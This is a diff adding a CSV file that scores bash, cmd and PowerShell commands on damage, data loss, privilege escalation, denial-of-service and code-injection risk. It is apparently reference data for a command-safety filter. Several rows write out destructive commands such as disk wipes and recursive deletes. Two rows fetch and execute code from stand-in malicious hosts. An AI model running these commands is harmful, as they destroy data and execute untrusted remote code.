@@ -1,0 +1,31 @@
+shell,command,argument,system_damage,data_loss,privilege_escalation,denial_of_service,code_injection
+bash,rm,-rf,0.9,1.0,0.7,0.4,0.0
+bash,dd,"if=/dev/zero of=/dev/sda",1.0,1.0,0.8,0.6,0.0
+bash,curl,"-s https://malware.com | sh",0.6,0.7,0.8,0.3,1.0
+bash,sudo,"-n true",0.7,0.2,1.0,0.2,0.0
+cmd,del,"/f /q",0.8,0.9,0.5,0.3,0.0
+cmd,reg.exe,"delete HKLM\\... /f",0.9,0.8,0.6,0.4,0.0
+powershell,Remove-Item,"-Recurse -Force",0.8,0.9,0.4,0.2,0.0
+powershell,Invoke-WebRequest,"-UseBasicParsing -Uri http://malicious -OutFile script.ps1; powershell -File script.ps1",0.7,0.5,0.9,0.5,1.0
+bash,rm,,0.6,0.7,0.4,0.2,0.0
+bash,rm,-r,0.8,0.9,0.6,0.3,0.0
+bash,rm,-f,0.7,0.8,0.5,0.3,0.0
+bash,curl,,0.2,0.2,0.3,0.1,0.4
+bash,curl,-s,0.3,0.3,0.4,0.1,0.5
+bash,sh,,0.5,0.5,0.4,0.2,0.9
+bash,dd,,0.8,0.8,0.4,0.5,0.0
+bash,apt-get,"install pkg",0.7,0.6,0.5,0.5,0.2
+bash,apt-get,update,0.2,0.2,0.1,0.1,0.0
+cmd,del,,0.6,0.7,0.4,0.2,0.0
+cmd,del,/f,0.7,0.8,0.4,0.2,0.0
+cmd,del,/s,0.8,0.9,0.4,0.3,0.0
+cmd,reg.exe,"add HKLM\\...",0.6,0.5,0.7,0.3,0.0
+cmd,format,c:,1.0,1.0,0.8,0.8,0.0
+cmd,shutdown,"/s /t 0",0.5,0.2,0.3,0.9,0.0
+powershell,Remove-Item,,0.6,0.7,0.3,0.2,0.0
+powershell,Remove-Item,-Recurse,0.7,0.8,0.3,0.2,0.0
+powershell,Invoke-WebRequest,,0.3,0.4,0.6,0.2,0.5
+powershell,Invoke-WebRequest,-UseBasicParsing,0.4,0.5,0.7,0.3,0.6
+powershell,Start-Process,,0.2,0.2,0.4,0.1,0.2
+powershell,Start-Process,"-FilePath notepad.exe",0.1,0.1,0.3,0.1,0.2
+powershell,Set-ExecutionPolicy,Unrestricted,0.1,0.2,0.8,0.4,0.1
